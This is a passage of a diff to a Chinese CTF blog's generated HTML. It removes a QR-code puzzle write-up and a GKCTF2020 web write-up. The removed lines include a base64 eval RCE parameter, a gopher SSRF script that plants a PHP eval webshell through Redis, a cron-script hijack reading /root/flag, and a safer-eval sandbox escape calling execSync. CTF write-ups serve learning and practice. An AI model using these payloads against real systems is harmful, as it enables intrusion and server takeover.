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
-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</code></pre><ul>
-<li>解码发现存在<code>Salted</code>的头，应该就是openssl加密的或者AES加密的。密码应该就是apache</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-090747@2x.png" alt="WX20201009-090747@2x"></p>
-<ul>
-<li>得到结果是0101，长度是4900，开平方正好是70×70,应该是一个二维码。</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-092252@2x.png" alt="WX20201009-092252@2x"></p>
-<ul>
-<li>写个小脚本生成一下</li>
-</ul>
-<pre><code class="python">from PIL import Image
-img = Image.new(&#39;RGB&#39;,(70,70),(0,0,0))
-table = [[0]*70]*70
-flag=0
-f = open(&#39;misc1.txt&#39;,&#39;r&#39;)
-string=&quot;&quot;
-flag2=0
-for i in f:
-    string=string+i
-for i in table:
-    flag2=flag2+1
-    for j in range(0,70):
-        if string[flag]==&#39;1&#39;:
-            img.putpixel((int(flag2)-1,int(j)),(255,255,255))
-        flag=flag+1
-
-
-img.show()
-f.close()
-</code></pre>
-<p><img src="https://goodcheerleung.gitee.io/macpic/tmpx4rn2w9s.png" alt="tmpx4rn2w9s"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001124@2x.png" alt="WX20201009-001124@2x"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001031@2x.png" alt></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000938@2x.png" alt="WX20201009-000938@2x"></p>
 
       
     </div>
@@ -2370,223 +2513,6 @@ gnuplot&gt;
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d5c12b792b.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/d5c12b792b.html" class="post-title-link" itemprop="url">GKCTF2020-CheckIN</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-05-27 16:21:20" itemprop="dateCreated datePublished" datetime="2020-05-27T16:21:20+08:00">2020-05-27</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-14 17:24:56" itemprop="dateModified" datetime="2020-10-14T17:24:56+08:00">2020-10-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>4.2k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>4 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>base64加密一下可以直接RCE：</p>
-<pre><code>?Ginkgo=ZXZhbCgkX1BPU1RbMV0pOw==</code></pre><p>测试发现<code>tmp</code>目录是可以写东西。但是直接读flag是没法读得。但是发现有readflag这个程序在根目录，但是这里把执行系统命令的函数都给禁了，这里要bypass 一下<code>disable function</code>.</p>
-<p>直接exp一把梭：</p>
-<p><a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p>
-<p>exp上传到/var/tmp/3.txt,直接包含执行就行了。</p>
-<pre><code>http://ebd8d9e8-ee16-4153-8396-b65d3b3b95ac.node3.buuoj.cn/?Ginkgo=ZXZhbCgkX0dFVFsnYSddKTs=&amp;a=var_dump(include(&#39;../../tmp/3.txt&#39;));</code></pre><blockquote>
-<p> echo pwn(“echo <code>/readflag</code> &gt; /var/tmp/a.txt”);</p>
-</blockquote>
-<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200526145744.png" alt="微信图片_20200526145744"></p>
-<h2 id="老八小超市儿"><a href="#老八小超市儿" class="headerlink" title="老八小超市儿"></a>老八小超市儿</h2><p>直接网上搜shopX0 getshell <a href="http://www.nctry.com/1660.html" target="_blank" rel="noopener">http://www.nctry.com/1660.html</a></p>
-<p>那道shell之后呢，发现根目录下的flag是假的，还有个hint。不知道这个hint有啥用，但是在auto.sh有一个很明显的地方</p>
-<pre><code>#!/bin/sh
-while true; do (python /var/mail/makeflaghint.py &amp;) &amp;&amp; sleep 60; done</code></pre><p>这里应该设定了定时任务每60秒执行一次这个脚本，而且这个makeflaghint.py 脚本我们有权限修改。我们直接修改脚本就能读到/root/flag。</p>
-<pre><code class="python">f = open(&#39;/root/flag&#39;,&#39;r&#39;)
-f2 = open(&#39;/666.txt&#39;,&#39;w&#39;)
-flag = f.read()
-f2.write(flag)
-f.close()
-f2.close()</code></pre>
-<h2 id="EZ三剑客-EzWeb"><a href="#EZ三剑客-EzWeb" class="headerlink" title="EZ三剑客-EzWeb"></a>EZ三剑客-EzWeb</h2><p>这道题和安恒还是广东强网某道题基本一样。也是SSRF打Redis.</p>
-<p>SSRF对内网IP进行探测然后对端口探测发现是Redis，然后EXP一把梭。</p>
-<pre><code class="python">import urllib
-import urllib.parse
-protocol=&quot;gopher://&quot;
-ip=&quot;173.138.94.11&quot;
-port=&quot;6379&quot;
-shell=&#39;\n\n&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;\n\n&#39;
-filename=&quot;shell.php&quot;
-path=&quot;/var/www/html&quot;
-passwd=&quot;&quot;
-cmd=[&quot;flushall&quot;,
-     &quot;set 1 {}&quot;.format(shell.replace(&quot; &quot;,&quot;${IFS}&quot;)),
-     &quot;config set dir {}&quot;.format(path),
-     &quot;config set dbfilename {}&quot;.format(filename),
-     &quot;save&quot;
-     ]
-if passwd:
-    cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))
-payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;
-def redis_format(arr):
-    CRLF=&quot;\r\n&quot;
-    redis_arr = arr.split(&quot; &quot;)
-    cmd=&quot;&quot;
-    cmd+=&quot;*&quot;+str(len(redis_arr))
-    for x in redis_arr:
-        cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)
-    cmd+=CRLF
-    return cmd
-
-if __name__==&quot;__main__&quot;:
-    for x in cmd:
-        payload += urllib.parse.quote(redis_format(x))
-    print(payload)</code></pre>
-<pre><code>gopher://173.138.94.11:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</code></pre><p>最后读flag需要绕一下空格。</p>
-<h2 id="cve版签到"><a href="#cve版签到" class="headerlink" title="cve版签到"></a>cve版签到</h2><pre><code>?url=http://127.0.0.123%00.ctfhub.com</code></pre><h2 id="EZ三剑客-EzNode"><a href="#EZ三剑客-EzNode" class="headerlink" title="EZ三剑客-EzNode"></a>EZ三剑客-EzNode</h2><pre><code class="javascript">const express = require(&#39;express&#39;);
-const bodyParser = require(&#39;body-parser&#39;);
-
-const saferEval = require(&#39;safer-eval&#39;); // 2019.7/WORKER1 找到一个很棒的库
-
-const fs = require(&#39;fs&#39;);
-
-const app = express();
-
-
-app.use(bodyParser.urlencoded({ extended: false }));
-app.use(bodyParser.json());
-
-// 2020.1/WORKER2 老板说为了后期方便优化
-app.use((req, res, next) =&gt; {
-  if (req.path === &#39;/eval&#39;) {
-    let delay = 60 * 1000;
-    console.log(delay);
-    if (Number.isInteger(parseInt(req.query.delay))) {
-      delay = Math.max(delay, parseInt(req.query.delay));
-    }
-    const t = setTimeout(() =&gt; next(), delay);
-    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事
-    setTimeout(() =&gt; {
-      clearTimeout(t);
-      console.log(&#39;timeout&#39;);
-      try {
-        res.send(&#39;Timeout!&#39;);
-      } catch (e) {
-
-      }
-    }, 1000);
-  } else {
-    next();
-  }
-});
-
-app.post(&#39;/eval&#39;, function (req, res) {
-  let response = &#39;&#39;;
-  if (req.body.e) {
-    try {
-      response = saferEval(req.body.e);
-    } catch (e) {
-      response = &#39;Wrong Wrong Wrong!!!!&#39;;
-    }
-  }
-  res.send(String(response));
-});
-
-// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
-app.get(&#39;/source&#39;, function (req, res) {
-  res.set(&#39;Content-Type&#39;, &#39;text/javascript;charset=utf-8&#39;);
-  res.send(fs.readFileSync(&#39;./index.js&#39;));
-});
-
-// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口
-app.get(&#39;/version&#39;, function (req, res) {
-  res.set(&#39;Content-Type&#39;, &#39;text/json;charset=utf-8&#39;);
-  res.send(fs.readFileSync(&#39;./package.json&#39;));
-});
-
-app.get(&#39;/&#39;, function (req, res) {
-  res.set(&#39;Content-Type&#39;, &#39;text/html;charset=utf-8&#39;);
-  res.send(fs.readFileSync(&#39;./index.html&#39;))
-})
-
-app.listen(80, &#39;0.0.0.0&#39;, () =&gt; {
-  console.log(&#39;Start listening&#39;)
-});</code></pre>
-<h4 id="小trick"><a href="#小trick" class="headerlink" title="小trick"></a>小trick</h4><ul>
-<li><p>setTimeout ，整数溢出，Infinity或者 ⼤于 2147483647</p>
-</li>
-<li><p>safeval <a href="https://github.com/commenthol/safer-eval/issues/10" target="_blank" rel="noopener">https://github.com/commenthol/safer-eval/issues/10</a></p>
-</li>
-</ul>
-<pre><code>setInterval.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;).toString();</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200527142405.png" alt="微信截图_20200527142405"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2658,7 +2584,7 @@ app.listen(80, &#39;0.0.0.0&#39;, () =&gt; {
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">63</span>
+          <span class="site-state-item-count">64</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2729,12 +2655,12 @@ app.listen(80, &#39;0.0.0.0&#39;, () =&gt; {
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">229k</span>
+    <span title="站点总字数">231k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:28</span>
+    <span title="站点阅读时长">3:30</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
